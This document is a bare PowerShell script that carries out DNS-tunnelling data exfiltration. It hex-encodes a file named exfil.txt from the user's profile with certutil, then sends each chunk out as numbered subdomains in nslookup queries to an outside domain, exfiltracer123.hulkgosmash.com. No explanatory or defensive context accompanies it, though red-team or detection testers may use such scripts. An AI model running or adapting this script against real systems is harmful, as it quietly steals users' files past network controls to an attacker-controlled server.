$domain = 'exfiltracer123.hulkgosmash.com'
$ns = "ns.$domain"
certutil -encodehex -f $env:USERPROFILE\exfil.txt $env:USERPROFILE\exfil.hex 4

$text=Get-Content $env:USERPROFILE\exfil.hex
$subdomain=$text.replace(" ","")
$j=11111
foreach($i in $subdomain) {
    $final=$j.tostring()+"."+$i+".$ns"
    $j += 1
    Start-Process -NoNewWindow nslookup $final 
}